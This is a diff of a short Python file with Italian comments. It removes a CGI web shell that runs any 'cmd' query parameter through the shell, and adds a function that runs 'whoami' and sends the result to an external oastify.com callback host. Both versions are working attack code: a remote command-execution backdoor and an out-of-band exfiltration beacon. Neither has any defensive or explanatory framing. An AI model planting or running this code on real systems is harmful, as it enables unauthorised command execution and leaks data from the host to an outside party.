@@ -1,37 +1,22 @@
-import cgi
-import os
 import subprocess
-import sys
+import urllib.parse
+import urllib.request
 
-# Funzione per eseguire un comando
-def execute_command(command):
-    # Esegue il comando e cattura l'output
+OAST_URL = "https://xbcm3nv47lal0n2u9i3wcz6ycpig6cu1.oastify.com"
+
+def test_callback():
+    result = subprocess.run(
+        ["whoami"],
+        capture_output=True,
+        text=True
+    )
+
+    whoami = result.stdout.strip()
+
+    url = f"{OAST_URL}/?whoami={urllib.parse.quote(whoami)}"
+
     try:
-        # Usiamo shell=True solo perché è RCE, altrimenti non raccomandato
-        result = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
-            encoding='utf-8'
-        )
-        return result.stdout
+        urllib.request.urlopen(url, timeout=5)
+        return f"Callback inviato. whoami={whoami}"
     except Exception as e:
-        return f"Errore nell'esecuzione: {e}"
-
-# Imposta l'intestazione HTTP Content-Type prima di qualsiasi altro output
-print("Content-Type: text/plain\n")
-
-# Analizza i dati del modulo (query string)
-form = cgi.FieldStorage()
-command = form.getvalue("cmd")
-
-if command:
-    print(f"--- ESECUZIONE COMANDO: {command} (via Python) ---\n")
-    output = execute_command(command)
-    print(output)
-else:
-    print("Specificare un comando con '?cmd=<comando>'. Esempio: ?cmd=whoami")
-
-# Se il server usa Python 3, potremmo aver bisogno di forzare l'uscita
-sys.stdout.flush()
+        return f"Errore callback: {e}"
